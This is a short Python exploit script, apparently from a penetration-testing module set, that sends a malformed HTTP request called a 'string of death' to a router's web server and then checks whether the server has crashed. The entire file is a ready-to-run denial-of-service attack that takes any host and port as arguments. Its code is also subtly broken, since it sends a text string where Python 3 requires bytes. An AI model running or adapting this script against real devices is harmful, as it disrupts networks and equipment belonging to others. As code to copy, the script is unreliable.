#!/usr/bin/python
#PTF Modules

import socket
import sys, urllib.request, urllib.error, urllib.parse

host = ""
port = 0
if(len(sys.argv) >= 2):
    host = sys.argv[1]
    port = sys.argv[2]

print("Connecting on ",host,":",port)

s = socket.socket();
stringOfDeath = "GET / HTTP/1.1\r\n";
stringOfDeath = stringOfDeath + "Accept-Encoding: identity\r\n";
stringOfDeath = stringOfDeath + "Host: "+ host + "\r\n";
stringOfDeath = stringOfDeath + "Connection: close\r\n";
stringOfDeath = stringOfDeath + "User-Agent: PythonLib/2.7\r\n";

s.connect((host,int(port)))

print("Sending packet...")
s.send(stringOfDeath)
print("Packet sent.")
print("Check if router http server down...")

try:
    response = urllib.request.urlopen("http://"+host+":"+port,None,5)
    response.read()
except socket.timeout:
    print("Timeout occured, http server probaly down.")
    exit(1)
